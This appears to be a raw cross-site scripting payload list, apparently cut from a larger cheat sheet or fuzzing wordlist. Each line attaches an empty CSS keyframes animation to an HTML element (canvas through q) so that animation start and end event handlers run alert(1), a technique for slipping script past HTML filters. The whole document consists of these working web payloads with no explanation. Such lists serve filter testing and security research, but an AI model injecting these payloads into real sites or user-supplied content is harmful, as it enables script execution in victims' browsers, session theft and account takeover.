<style>@keyframes x{}</style><canvas style="animation-name:x" onwebkitanimationend="alert(1)"></canvas>
<style>@keyframes x{}</style><canvas style="animation-name:x" onwebkitanimationstart="alert(1)"></canvas>
<style>@keyframes x{}</style><caption style="animation-name:x" onanimationend="alert(1)"></caption>
<style>@keyframes x{}</style><caption style="animation-name:x" onanimationstart="alert(1)"></caption>
<style>@keyframes x{}</style><caption style="animation-name:x" onwebkitanimationend="alert(1)"></caption>
<style>@keyframes x{}</style><caption style="animation-name:x" onwebkitanimationstart="alert(1)"></caption>
<style>@keyframes x{}</style><center style="animation-name:x" onanimationend="alert(1)"></center>
<style>@keyframes x{}</style><center style="animation-name:x" onanimationstart="alert(1)"></center>
<style>@keyframes x{}</style><center style="animation-name:x" onwebkitanimationend="alert(1)"></center>
<style>@keyframes x{}</style><center style="animation-name:x" onwebkitanimationstart="alert(1)"></center>
<style>@keyframes x{}</style><cite style="animation-name:x" onanimationend="alert(1)"></cite>
<style>@keyframes x{}</style><cite style="animation-name:x" onanimationstart="alert(1)"></cite>
<style>@keyframes x{}</style><cite style="animation-name:x" onwebkitanimationend="alert(1)"></cite>
<style>@keyframes x{}</style><cite style="animation-name:x" onwebkitanimationstart="alert(1)"></cite>
<style>@keyframes x{}</style><code style="animation-name:x" onanimationend="alert(1)"></code>
<style>@keyframes x{}</style><code style="animation-name:x" onanimationstart="alert(1)"></code>
<style>@keyframes x{}</style><code style="animation-name:x" onwebkitanimationend="alert(1)"></code>
<style>@keyframes x{}</style><code style="animation-name:x" onwebkitanimationstart="alert(1)"></code>
<style>@keyframes x{}</style><col style="animation-name:x" onanimationend="alert(1)"></col>
<style>@keyframes x{}</style><col style="animation-name:x" onanimationstart="alert(1)"></col>
<style>@keyframes x{}</style><col style="animation-name:x" onwebkitanimationend="alert(1)"></col>
<style>@keyframes x{}</style><col style="animation-name:x" onwebkitanimationstart="alert(1)"></col>
<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationend="alert(1)"></colgroup>
<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationstart="alert(1)"></colgroup>
<style>@keyframes x{}</style><colgroup style="animation-name:x" onwebkitanimationend="alert(1)"></colgroup>
<style>@keyframes x{}</style><colgroup style="animation-name:x" onwebkitanimationstart="alert(1)"></colgroup>
<style>@keyframes x{}</style><command style="animation-name:x" onanimationend="alert(1)"></command>
<style>@keyframes x{}</style><command style="animation-name:x" onanimationstart="alert(1)"></command>
<style>@keyframes x{}</style><command style="animation-name:x" onwebkitanimationend="alert(1)"></command>
<style>@keyframes x{}</style><command style="animation-name:x" onwebkitanimationstart="alert(1)"></command>
<style>@keyframes x{}</style><content style="animation-name:x" onanimationend="alert(1)"></content>
<style>@keyframes x{}</style><content style="animation-name:x" onanimationstart="alert(1)"></content>
<style>@keyframes x{}</style><content style="animation-name:x" onwebkitanimationend="alert(1)"></content>
<style>@keyframes x{}</style><content style="animation-name:x" onwebkitanimationstart="alert(1)"></content>
<style>@keyframes x{}</style><custom tags style="animation-name:x" onanimationend="alert(1)"></custom tags>
<style>@keyframes x{}</style><custom tags style="animation-name:x" onanimationstart="alert(1)"></custom tags>
<style>@keyframes x{}</style><custom tags style="animation-name:x" onwebkitanimationend="alert(1)"></custom tags>
<style>@keyframes x{}</style><custom tags style="animation-name:x" onwebkitanimationstart="alert(1)"></custom tags>
<style>@keyframes x{}</style><data style="animation-name:x" onanimationend="alert(1)"></data>
<style>@keyframes x{}</style><data style="animation-name:x" onanimationstart="alert(1)"></data>
<style>@keyframes x{}</style><data style="animation-name:x" onwebkitanimationend="alert(1)"></data>
<style>@keyframes x{}</style><data style="animation-name:x" onwebkitanimationstart="alert(1)"></data>
<style>@keyframes x{}</style><datalist style="animation-name:x" onanimationend="alert(1)"></datalist>
<style>@keyframes x{}</style><datalist style="animation-name:x" onanimationstart="alert(1)"></datalist>
<style>@keyframes x{}</style><datalist style="animation-name:x" onwebkitanimationend="alert(1)"></datalist>
<style>@keyframes x{}</style><datalist style="animation-name:x" onwebkitanimationstart="alert(1)"></datalist>
<style>@keyframes x{}</style><dd style="animation-name:x" onanimationend="alert(1)"></dd>
<style>@keyframes x{}</style><dd style="animation-name:x" onanimationstart="alert(1)"></dd>
<style>@keyframes x{}</style><dd style="animation-name:x" onwebkitanimationend="alert(1)"></dd>
<style>@keyframes x{}</style><dd style="animation-name:x" onwebkitanimationstart="alert(1)"></dd>
<style>@keyframes x{}</style><del style="animation-name:x" onanimationend="alert(1)"></del>
<style>@keyframes x{}</style><del style="animation-name:x" onanimationstart="alert(1)"></del>
<style>@keyframes x{}</style><del style="animation-name:x" onwebkitanimationend="alert(1)"></del>
<style>@keyframes x{}</style><del style="animation-name:x" onwebkitanimationstart="alert(1)"></del>
<style>@keyframes x{}</style><details style="animation-name:x" onanimationend="alert(1)"></details>
<style>@keyframes x{}</style><details style="animation-name:x" onanimationstart="alert(1)"></details>
<style>@keyframes x{}</style><details style="animation-name:x" onwebkitanimationend="alert(1)"></details>
<style>@keyframes x{}</style><details style="animation-name:x" onwebkitanimationstart="alert(1)"></details>
<style>@keyframes x{}</style><dfn style="animation-name:x" onanimationend="alert(1)"></dfn>
<style>@keyframes x{}</style><dfn style="animation-name:x" onanimationstart="alert(1)"></dfn>
<style>@keyframes x{}</style><dfn style="animation-name:x" onwebkitanimationend="alert(1)"></dfn>
<style>@keyframes x{}</style><dfn style="animation-name:x" onwebkitanimationstart="alert(1)"></dfn>
<style>@keyframes x{}</style><dialog style="animation-name:x" onanimationend="alert(1)"></dialog>
<style>@keyframes x{}</style><dialog style="animation-name:x" onanimationstart="alert(1)"></dialog>
<style>@keyframes x{}</style><dialog style="animation-name:x" onwebkitanimationend="alert(1)"></dialog>
<style>@keyframes x{}</style><dialog style="animation-name:x" onwebkitanimationstart="alert(1)"></dialog>
<style>@keyframes x{}</style><dir style="animation-name:x" onanimationend="alert(1)"></dir>
<style>@keyframes x{}</style><dir style="animation-name:x" onanimationstart="alert(1)"></dir>
<style>@keyframes x{}</style><dir style="animation-name:x" onwebkitanimationend="alert(1)"></dir>
<style>@keyframes x{}</style><dir style="animation-name:x" onwebkitanimationstart="alert(1)"></dir>
<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)"></div>
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
<style>@keyframes x{}</style><div style="animation-name:x" onwebkitanimationend="alert(1)"></div>
<style>@keyframes x{}</style><div style="animation-name:x" onwebkitanimationstart="alert(1)"></div>
<style>@keyframes x{}</style><dl style="animation-name:x" onanimationend="alert(1)"></dl>
<style>@keyframes x{}</style><dl style="animation-name:x" onanimationstart="alert(1)"></dl>
<style>@keyframes x{}</style><dl style="animation-name:x" onwebkitanimationend="alert(1)"></dl>
<style>@keyframes x{}</style><dl style="animation-name:x" onwebkitanimationstart="alert(1)"></dl>
<style>@keyframes x{}</style><dt style="animation-name:x" onanimationend="alert(1)"></dt>
<style>@keyframes x{}</style><dt style="animation-name:x" onanimationstart="alert(1)"></dt>
<style>@keyframes x{}</style><dt style="animation-name:x" onwebkitanimationend="alert(1)"></dt>
<style>@keyframes x{}</style><dt style="animation-name:x" onwebkitanimationstart="alert(1)"></dt>
<style>@keyframes x{}</style><element style="animation-name:x" onanimationend="alert(1)"></element>
<style>@keyframes x{}</style><element style="animation-name:x" onanimationstart="alert(1)"></element>
<style>@keyframes x{}</style><element style="animation-name:x" onwebkitanimationend="alert(1)"></element>
<style>@keyframes x{}</style><element style="animation-name:x" onwebkitanimationstart="alert(1)"></element>
<style>@keyframes x{}</style><em style="animation-name:x" onanimationend="alert(1)"></em>
<style>@keyframes x{}</style><em style="animation-name:x" onanimationstart="alert(1)"></em>
<style>@keyframes x{}</style><em style="animation-name:x" onwebkitanimationend="alert(1)"></em>
<style>@keyframes x{}</style><em style="animation-name:x" onwebkitanimationstart="alert(1)"></em>
<style>@keyframes x{}</style><embed style="animation-name:x" onanimationend="alert(1)"></embed>
<style>@keyframes x{}</style><embed style="animation-name:x" onanimationstart="alert(1)"></embed>
<style>@keyframes x{}</style><embed style="animation-name:x" onwebkitanimationend="alert(1)"></embed>
<style>@keyframes x{}</style><embed style="animation-name:x" onwebkitanimationstart="alert(1)"></embed>
<style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationend="alert(1)"></fieldset>
<style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationstart="alert(1)"></fieldset>
<style>@keyframes x{}</style><fieldset style="animation-name:x" onwebkitanimationend="alert(1)"></fieldset>
<style>@keyframes x{}</style><fieldset style="animation-name:x" onwebkitanimationstart="alert(1)"></fieldset>
<style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationend="alert(1)"></figcaption>
<style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationstart="alert(1)"></figcaption>
<style>@keyframes x{}</style><figcaption style="animation-name:x" onwebkitanimationend="alert(1)"></figcaption>
<style>@keyframes x{}</style><figcaption style="animation-name:x" onwebkitanimationstart="alert(1)"></figcaption>
<style>@keyframes x{}</style><figure style="animation-name:x" onanimationend="alert(1)"></figure>
<style>@keyframes x{}</style><figure style="animation-name:x" onanimationstart="alert(1)"></figure>
<style>@keyframes x{}</style><figure style="animation-name:x" onwebkitanimationend="alert(1)"></figure>
<style>@keyframes x{}</style><figure style="animation-name:x" onwebkitanimationstart="alert(1)"></figure>
<style>@keyframes x{}</style><font style="animation-name:x" onanimationend="alert(1)"></font>
<style>@keyframes x{}</style><font style="animation-name:x" onanimationstart="alert(1)"></font>
<style>@keyframes x{}</style><font style="animation-name:x" onwebkitanimationend="alert(1)"></font>
<style>@keyframes x{}</style><font style="animation-name:x" onwebkitanimationstart="alert(1)"></font>
<style>@keyframes x{}</style><footer style="animation-name:x" onanimationend="alert(1)"></footer>
<style>@keyframes x{}</style><footer style="animation-name:x" onanimationstart="alert(1)"></footer>
<style>@keyframes x{}</style><footer style="animation-name:x" onwebkitanimationend="alert(1)"></footer>
<style>@keyframes x{}</style><footer style="animation-name:x" onwebkitanimationstart="alert(1)"></footer>
<style>@keyframes x{}</style><form style="animation-name:x" onanimationend="alert(1)"></form>
<style>@keyframes x{}</style><form style="animation-name:x" onanimationstart="alert(1)"></form>
<style>@keyframes x{}</style><form style="animation-name:x" onwebkitanimationend="alert(1)"></form>
<style>@keyframes x{}</style><form style="animation-name:x" onwebkitanimationstart="alert(1)"></form>
<style>@keyframes x{}</style><frame style="animation-name:x" onanimationend="alert(1)"></frame>
<style>@keyframes x{}</style><frame style="animation-name:x" onanimationstart="alert(1)"></frame>
<style>@keyframes x{}</style><frame style="animation-name:x" onwebkitanimationend="alert(1)"></frame>
<style>@keyframes x{}</style><frame style="animation-name:x" onwebkitanimationstart="alert(1)"></frame>
<style>@keyframes x{}</style><frameset style="animation-name:x" onanimationend="alert(1)"></frameset>
<style>@keyframes x{}</style><frameset style="animation-name:x" onanimationstart="alert(1)"></frameset>
<style>@keyframes x{}</style><frameset style="animation-name:x" onwebkitanimationend="alert(1)"></frameset>
<style>@keyframes x{}</style><frameset style="animation-name:x" onwebkitanimationstart="alert(1)"></frameset>
<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="alert(1)"></h1>
<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationstart="alert(1)"></h1>
<style>@keyframes x{}</style><h1 style="animation-name:x" onwebkitanimationend="alert(1)"></h1>
<style>@keyframes x{}</style><h1 style="animation-name:x" onwebkitanimationstart="alert(1)"></h1>
<style>@keyframes x{}</style><head style="animation-name:x" onanimationend="alert(1)"></head>
<style>@keyframes x{}</style><head style="animation-name:x" onanimationstart="alert(1)"></head>
<style>@keyframes x{}</style><head style="animation-name:x" onwebkitanimationend="alert(1)"></head>
<style>@keyframes x{}</style><head style="animation-name:x" onwebkitanimationstart="alert(1)"></head>
<style>@keyframes x{}</style><header style="animation-name:x" onanimationend="alert(1)"></header>
<style>@keyframes x{}</style><header style="animation-name:x" onanimationstart="alert(1)"></header>
<style>@keyframes x{}</style><header style="animation-name:x" onwebkitanimationend="alert(1)"></header>
<style>@keyframes x{}</style><header style="animation-name:x" onwebkitanimationstart="alert(1)"></header>
<style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationend="alert(1)"></hgroup>
<style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationstart="alert(1)"></hgroup>
<style>@keyframes x{}</style><hgroup style="animation-name:x" onwebkitanimationend="alert(1)"></hgroup>
<style>@keyframes x{}</style><hgroup style="animation-name:x" onwebkitanimationstart="alert(1)"></hgroup>
<style>@keyframes x{}</style><hr style="animation-name:x" onanimationend="alert(1)"></hr>
<style>@keyframes x{}</style><hr style="animation-name:x" onanimationstart="alert(1)"></hr>
<style>@keyframes x{}</style><hr style="animation-name:x" onwebkitanimationend="alert(1)"></hr>
<style>@keyframes x{}</style><hr style="animation-name:x" onwebkitanimationstart="alert(1)"></hr>
<style>@keyframes x{}</style><html style="animation-name:x" onanimationend="alert(1)"></html>
<style>@keyframes x{}</style><html style="animation-name:x" onanimationstart="alert(1)"></html>
<style>@keyframes x{}</style><html style="animation-name:x" onwebkitanimationend="alert(1)"></html>
<style>@keyframes x{}</style><html style="animation-name:x" onwebkitanimationstart="alert(1)"></html>
<style>@keyframes x{}</style><i style="animation-name:x" onanimationend="alert(1)"></i>
<style>@keyframes x{}</style><i style="animation-name:x" onanimationstart="alert(1)"></i>
<style>@keyframes x{}</style><i style="animation-name:x" onwebkitanimationend="alert(1)"></i>
<style>@keyframes x{}</style><i style="animation-name:x" onwebkitanimationstart="alert(1)"></i>
<style>@keyframes x{}</style><iframe style="animation-name:x" onanimationend="alert(1)"></iframe>
<style>@keyframes x{}</style><iframe style="animation-name:x" onanimationstart="alert(1)"></iframe>
<style>@keyframes x{}</style><iframe style="animation-name:x" onwebkitanimationend="alert(1)"></iframe>
<style>@keyframes x{}</style><iframe style="animation-name:x" onwebkitanimationstart="alert(1)"></iframe>
<style>@keyframes x{}</style><iframe2 style="animation-name:x" onanimationend="alert(1)"></iframe2>
<style>@keyframes x{}</style><iframe2 style="animation-name:x" onanimationstart="alert(1)"></iframe2>
<style>@keyframes x{}</style><iframe2 style="animation-name:x" onwebkitanimationend="alert(1)"></iframe2>
<style>@keyframes x{}</style><iframe2 style="animation-name:x" onwebkitanimationstart="alert(1)"></iframe2>
<style>@keyframes x{}</style><image style="animation-name:x" onanimationend="alert(1)"></image>
<style>@keyframes x{}</style><image style="animation-name:x" onanimationstart="alert(1)"></image>
<style>@keyframes x{}</style><image style="animation-name:x" onwebkitanimationend="alert(1)"></image>
<style>@keyframes x{}</style><image style="animation-name:x" onwebkitanimationstart="alert(1)"></image>
<style>@keyframes x{}</style><image2 style="animation-name:x" onanimationend="alert(1)"></image2>
<style>@keyframes x{}</style><image2 style="animation-name:x" onanimationstart="alert(1)"></image2>
<style>@keyframes x{}</style><image2 style="animation-name:x" onwebkitanimationend="alert(1)"></image2>
<style>@keyframes x{}</style><image2 style="animation-name:x" onwebkitanimationstart="alert(1)"></image2>
<style>@keyframes x{}</style><image3 style="animation-name:x" onanimationend="alert(1)"></image3>
<style>@keyframes x{}</style><image3 style="animation-name:x" onanimationstart="alert(1)"></image3>
<style>@keyframes x{}</style><image3 style="animation-name:x" onwebkitanimationend="alert(1)"></image3>
<style>@keyframes x{}</style><image3 style="animation-name:x" onwebkitanimationstart="alert(1)"></image3>
<style>@keyframes x{}</style><img style="animation-name:x" onanimationend="alert(1)"></img>
<style>@keyframes x{}</style><img style="animation-name:x" onanimationstart="alert(1)"></img>
<style>@keyframes x{}</style><img style="animation-name:x" onwebkitanimationend="alert(1)"></img>
<style>@keyframes x{}</style><img style="animation-name:x" onwebkitanimationstart="alert(1)"></img>
<style>@keyframes x{}</style><img2 style="animation-name:x" onanimationend="alert(1)"></img2>
<style>@keyframes x{}</style><img2 style="animation-name:x" onanimationstart="alert(1)"></img2>
<style>@keyframes x{}</style><img2 style="animation-name:x" onwebkitanimationend="alert(1)"></img2>
<style>@keyframes x{}</style><img2 style="animation-name:x" onwebkitanimationstart="alert(1)"></img2>
<style>@keyframes x{}</style><input style="animation-name:x" onanimationend="alert(1)"></input>
<style>@keyframes x{}</style><input style="animation-name:x" onanimationstart="alert(1)"></input>
<style>@keyframes x{}</style><input style="animation-name:x" onwebkitanimationend="alert(1)"></input>
<style>@keyframes x{}</style><input style="animation-name:x" onwebkitanimationstart="alert(1)"></input>
<style>@keyframes x{}</style><input2 style="animation-name:x" onanimationend="alert(1)"></input2>
<style>@keyframes x{}</style><input2 style="animation-name:x" onanimationstart="alert(1)"></input2>
<style>@keyframes x{}</style><input2 style="animation-name:x" onwebkitanimationend="alert(1)"></input2>
<style>@keyframes x{}</style><input2 style="animation-name:x" onwebkitanimationstart="alert(1)"></input2>
<style>@keyframes x{}</style><input3 style="animation-name:x" onanimationend="alert(1)"></input3>
<style>@keyframes x{}</style><input3 style="animation-name:x" onanimationstart="alert(1)"></input3>
<style>@keyframes x{}</style><input3 style="animation-name:x" onwebkitanimationend="alert(1)"></input3>
<style>@keyframes x{}</style><input3 style="animation-name:x" onwebkitanimationstart="alert(1)"></input3>
<style>@keyframes x{}</style><input4 style="animation-name:x" onanimationend="alert(1)"></input4>
<style>@keyframes x{}</style><input4 style="animation-name:x" onanimationstart="alert(1)"></input4>
<style>@keyframes x{}</style><input4 style="animation-name:x" onwebkitanimationend="alert(1)"></input4>
<style>@keyframes x{}</style><input4 style="animation-name:x" onwebkitanimationstart="alert(1)"></input4>
<style>@keyframes x{}</style><ins style="animation-name:x" onanimationend="alert(1)"></ins>
<style>@keyframes x{}</style><ins style="animation-name:x" onanimationstart="alert(1)"></ins>
<style>@keyframes x{}</style><ins style="animation-name:x" onwebkitanimationend="alert(1)"></ins>
<style>@keyframes x{}</style><ins style="animation-name:x" onwebkitanimationstart="alert(1)"></ins>
<style>@keyframes x{}</style><kbd style="animation-name:x" onanimationend="alert(1)"></kbd>
<style>@keyframes x{}</style><kbd style="animation-name:x" onanimationstart="alert(1)"></kbd>
<style>@keyframes x{}</style><kbd style="animation-name:x" onwebkitanimationend="alert(1)"></kbd>
<style>@keyframes x{}</style><kbd style="animation-name:x" onwebkitanimationstart="alert(1)"></kbd>
<style>@keyframes x{}</style><keygen style="animation-name:x" onanimationend="alert(1)"></keygen>
<style>@keyframes x{}</style><keygen style="animation-name:x" onanimationstart="alert(1)"></keygen>
<style>@keyframes x{}</style><keygen style="animation-name:x" onwebkitanimationend="alert(1)"></keygen>
<style>@keyframes x{}</style><keygen style="animation-name:x" onwebkitanimationstart="alert(1)"></keygen>
<style>@keyframes x{}</style><label style="animation-name:x" onanimationend="alert(1)"></label>
<style>@keyframes x{}</style><label style="animation-name:x" onanimationstart="alert(1)"></label>
<style>@keyframes x{}</style><label style="animation-name:x" onwebkitanimationend="alert(1)"></label>
<style>@keyframes x{}</style><label style="animation-name:x" onwebkitanimationstart="alert(1)"></label>
<style>@keyframes x{}</style><legend style="animation-name:x" onanimationend="alert(1)"></legend>
<style>@keyframes x{}</style><legend style="animation-name:x" onanimationstart="alert(1)"></legend>
<style>@keyframes x{}</style><legend style="animation-name:x" onwebkitanimationend="alert(1)"></legend>
<style>@keyframes x{}</style><legend style="animation-name:x" onwebkitanimationstart="alert(1)"></legend>
<style>@keyframes x{}</style><li style="animation-name:x" onanimationend="alert(1)"></li>
<style>@keyframes x{}</style><li style="animation-name:x" onanimationstart="alert(1)"></li>
<style>@keyframes x{}</style><li style="animation-name:x" onwebkitanimationend="alert(1)"></li>
<style>@keyframes x{}</style><li style="animation-name:x" onwebkitanimationstart="alert(1)"></li>
<style>@keyframes x{}</style><link style="animation-name:x" onanimationend="alert(1)"></link>
<style>@keyframes x{}</style><link style="animation-name:x" onanimationstart="alert(1)"></link>
<style>@keyframes x{}</style><link style="animation-name:x" onwebkitanimationend="alert(1)"></link>
<style>@keyframes x{}</style><link style="animation-name:x" onwebkitanimationstart="alert(1)"></link>
<style>@keyframes x{}</style><listing style="animation-name:x" onanimationend="alert(1)"></listing>
<style>@keyframes x{}</style><listing style="animation-name:x" onanimationstart="alert(1)"></listing>
<style>@keyframes x{}</style><listing style="animation-name:x" onwebkitanimationend="alert(1)"></listing>
<style>@keyframes x{}</style><listing style="animation-name:x" onwebkitanimationstart="alert(1)"></listing>
<style>@keyframes x{}</style><main style="animation-name:x" onanimationend="alert(1)"></main>
<style>@keyframes x{}</style><main style="animation-name:x" onanimationstart="alert(1)"></main>
<style>@keyframes x{}</style><main style="animation-name:x" onwebkitanimationend="alert(1)"></main>
<style>@keyframes x{}</style><main style="animation-name:x" onwebkitanimationstart="alert(1)"></main>
<style>@keyframes x{}</style><map style="animation-name:x" onanimationend="alert(1)"></map>
<style>@keyframes x{}</style><map style="animation-name:x" onanimationstart="alert(1)"></map>
<style>@keyframes x{}</style><map style="animation-name:x" onwebkitanimationend="alert(1)"></map>
<style>@keyframes x{}</style><map style="animation-name:x" onwebkitanimationstart="alert(1)"></map>
<style>@keyframes x{}</style><mark style="animation-name:x" onanimationend="alert(1)"></mark>
<style>@keyframes x{}</style><mark style="animation-name:x" onanimationstart="alert(1)"></mark>
<style>@keyframes x{}</style><mark style="animation-name:x" onwebkitanimationend="alert(1)"></mark>
<style>@keyframes x{}</style><mark style="animation-name:x" onwebkitanimationstart="alert(1)"></mark>
<style>@keyframes x{}</style><marquee style="animation-name:x" onanimationend="alert(1)"></marquee>
<style>@keyframes x{}</style><marquee style="animation-name:x" onanimationstart="alert(1)"></marquee>
<style>@keyframes x{}</style><marquee style="animation-name:x" onwebkitanimationend="alert(1)"></marquee>
<style>@keyframes x{}</style><marquee style="animation-name:x" onwebkitanimationstart="alert(1)"></marquee>
<style>@keyframes x{}</style><menu style="animation-name:x" onanimationend="alert(1)"></menu>
<style>@keyframes x{}</style><menu style="animation-name:x" onanimationstart="alert(1)"></menu>
<style>@keyframes x{}</style><menu style="animation-name:x" onwebkitanimationend="alert(1)"></menu>
<style>@keyframes x{}</style><menu style="animation-name:x" onwebkitanimationstart="alert(1)"></menu>
<style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationend="alert(1)"></menuitem>
<style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationstart="alert(1)"></menuitem>
<style>@keyframes x{}</style><menuitem style="animation-name:x" onwebkitanimationend="alert(1)"></menuitem>
<style>@keyframes x{}</style><menuitem style="animation-name:x" onwebkitanimationstart="alert(1)"></menuitem>
<style>@keyframes x{}</style><meta style="animation-name:x" onanimationend="alert(1)"></meta>
<style>@keyframes x{}</style><meta style="animation-name:x" onanimationstart="alert(1)"></meta>
<style>@keyframes x{}</style><meta style="animation-name:x" onwebkitanimationend="alert(1)"></meta>
<style>@keyframes x{}</style><meta style="animation-name:x" onwebkitanimationstart="alert(1)"></meta>
<style>@keyframes x{}</style><meter style="animation-name:x" onanimationend="alert(1)"></meter>
<style>@keyframes x{}</style><meter style="animation-name:x" onanimationstart="alert(1)"></meter>
<style>@keyframes x{}</style><meter style="animation-name:x" onwebkitanimationend="alert(1)"></meter>
<style>@keyframes x{}</style><meter style="animation-name:x" onwebkitanimationstart="alert(1)"></meter>
<style>@keyframes x{}</style><multicol style="animation-name:x" onanimationend="alert(1)"></multicol>
<style>@keyframes x{}</style><multicol style="animation-name:x" onanimationstart="alert(1)"></multicol>
<style>@keyframes x{}</style><multicol style="animation-name:x" onwebkitanimationend="alert(1)"></multicol>
<style>@keyframes x{}</style><multicol style="animation-name:x" onwebkitanimationstart="alert(1)"></multicol>
<style>@keyframes x{}</style><nav style="animation-name:x" onanimationend="alert(1)"></nav>
<style>@keyframes x{}</style><nav style="animation-name:x" onanimationstart="alert(1)"></nav>
<style>@keyframes x{}</style><nav style="animation-name:x" onwebkitanimationend="alert(1)"></nav>
<style>@keyframes x{}</style><nav style="animation-name:x" onwebkitanimationstart="alert(1)"></nav>
<style>@keyframes x{}</style><nextid style="animation-name:x" onanimationend="alert(1)"></nextid>
<style>@keyframes x{}</style><nextid style="animation-name:x" onanimationstart="alert(1)"></nextid>
<style>@keyframes x{}</style><nextid style="animation-name:x" onwebkitanimationend="alert(1)"></nextid>
<style>@keyframes x{}</style><nextid style="animation-name:x" onwebkitanimationstart="alert(1)"></nextid>
<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationend="alert(1)"></nobr>
<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationstart="alert(1)"></nobr>
<style>@keyframes x{}</style><nobr style="animation-name:x" onwebkitanimationend="alert(1)"></nobr>
<style>@keyframes x{}</style><nobr style="animation-name:x" onwebkitanimationstart="alert(1)"></nobr>
<style>@keyframes x{}</style><noembed style="animation-name:x" onanimationend="alert(1)"></noembed>
<style>@keyframes x{}</style><noembed style="animation-name:x" onanimationstart="alert(1)"></noembed>
<style>@keyframes x{}</style><noembed style="animation-name:x" onwebkitanimationend="alert(1)"></noembed>
<style>@keyframes x{}</style><noembed style="animation-name:x" onwebkitanimationstart="alert(1)"></noembed>
<style>@keyframes x{}</style><noframes style="animation-name:x" onanimationend="alert(1)"></noframes>
<style>@keyframes x{}</style><noframes style="animation-name:x" onanimationstart="alert(1)"></noframes>
<style>@keyframes x{}</style><noframes style="animation-name:x" onwebkitanimationend="alert(1)"></noframes>
<style>@keyframes x{}</style><noframes style="animation-name:x" onwebkitanimationstart="alert(1)"></noframes>
<style>@keyframes x{}</style><noscript style="animation-name:x" onanimationend="alert(1)"></noscript>
<style>@keyframes x{}</style><noscript style="animation-name:x" onanimationstart="alert(1)"></noscript>
<style>@keyframes x{}</style><noscript style="animation-name:x" onwebkitanimationend="alert(1)"></noscript>
<style>@keyframes x{}</style><noscript style="animation-name:x" onwebkitanimationstart="alert(1)"></noscript>
<style>@keyframes x{}</style><object style="animation-name:x" onanimationend="alert(1)"></object>
<style>@keyframes x{}</style><object style="animation-name:x" onanimationstart="alert(1)"></object>
<style>@keyframes x{}</style><object style="animation-name:x" onwebkitanimationend="alert(1)"></object>
<style>@keyframes x{}</style><object style="animation-name:x" onwebkitanimationstart="alert(1)"></object>
<style>@keyframes x{}</style><ol style="animation-name:x" onanimationend="alert(1)"></ol>
<style>@keyframes x{}</style><ol style="animation-name:x" onanimationstart="alert(1)"></ol>
<style>@keyframes x{}</style><ol style="animation-name:x" onwebkitanimationend="alert(1)"></ol>
<style>@keyframes x{}</style><ol style="animation-name:x" onwebkitanimationstart="alert(1)"></ol>
<style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationend="alert(1)"></optgroup>
<style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationstart="alert(1)"></optgroup>
<style>@keyframes x{}</style><optgroup style="animation-name:x" onwebkitanimationend="alert(1)"></optgroup>
<style>@keyframes x{}</style><optgroup style="animation-name:x" onwebkitanimationstart="alert(1)"></optgroup>
<style>@keyframes x{}</style><option style="animation-name:x" onanimationend="alert(1)"></option>
<style>@keyframes x{}</style><option style="animation-name:x" onanimationstart="alert(1)"></option>
<style>@keyframes x{}</style><option style="animation-name:x" onwebkitanimationend="alert(1)"></option>
<style>@keyframes x{}</style><option style="animation-name:x" onwebkitanimationstart="alert(1)"></option>
<style>@keyframes x{}</style><output style="animation-name:x" onanimationend="alert(1)"></output>
<style>@keyframes x{}</style><output style="animation-name:x" onanimationstart="alert(1)"></output>
<style>@keyframes x{}</style><output style="animation-name:x" onwebkitanimationend="alert(1)"></output>
<style>@keyframes x{}</style><output style="animation-name:x" onwebkitanimationstart="alert(1)"></output>
<style>@keyframes x{}</style><p style="animation-name:x" onanimationend="alert(1)"></p>
<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="alert(1)"></p>
<style>@keyframes x{}</style><p style="animation-name:x" onwebkitanimationend="alert(1)"></p>
<style>@keyframes x{}</style><p style="animation-name:x" onwebkitanimationstart="alert(1)"></p>
<style>@keyframes x{}</style><param style="animation-name:x" onanimationend="alert(1)"></param>
<style>@keyframes x{}</style><param style="animation-name:x" onanimationstart="alert(1)"></param>
<style>@keyframes x{}</style><param style="animation-name:x" onwebkitanimationend="alert(1)"></param>
<style>@keyframes x{}</style><param style="animation-name:x" onwebkitanimationstart="alert(1)"></param>
<style>@keyframes x{}</style><picture style="animation-name:x" onanimationend="alert(1)"></picture>
<style>@keyframes x{}</style><picture style="animation-name:x" onanimationstart="alert(1)"></picture>
<style>@keyframes x{}</style><picture style="animation-name:x" onwebkitanimationend="alert(1)"></picture>
<style>@keyframes x{}</style><picture style="animation-name:x" onwebkitanimationstart="alert(1)"></picture>
<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationend="alert(1)"></plaintext>
<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationstart="alert(1)"></plaintext>
<style>@keyframes x{}</style><plaintext style="animation-name:x" onwebkitanimationend="alert(1)"></plaintext>
<style>@keyframes x{}</style><plaintext style="animation-name:x" onwebkitanimationstart="alert(1)"></plaintext>
<style>@keyframes x{}</style><pre style="animation-name:x" onanimationend="alert(1)"></pre>
<style>@keyframes x{}</style><pre style="animation-name:x" onanimationstart="alert(1)"></pre>
<style>@keyframes x{}</style><pre style="animation-name:x" onwebkitanimationend="alert(1)"></pre>
<style>@keyframes x{}</style><pre style="animation-name:x" onwebkitanimationstart="alert(1)"></pre>
<style>@keyframes x{}</style><progress style="animation-name:x" onanimationend="alert(1)"></progress>
<style>@keyframes x{}</style><progress style="animation-name:x" onanimationstart="alert(1)"></progress>
<style>@keyframes x{}</style><progress style="animation-name:x" onwebkitanimationend="alert(1)"></progress>
<style>@keyframes x{}</style><progress style="animation-name:x" onwebkitanimationstart="alert(1)"></progress>
<style>@keyframes x{}</style><q style="animation-name:x" onanimationend="alert(1)"></q>
<style>@keyframes x{}</style><q style="animation-name:x" onanimationstart="alert(1)"></q>
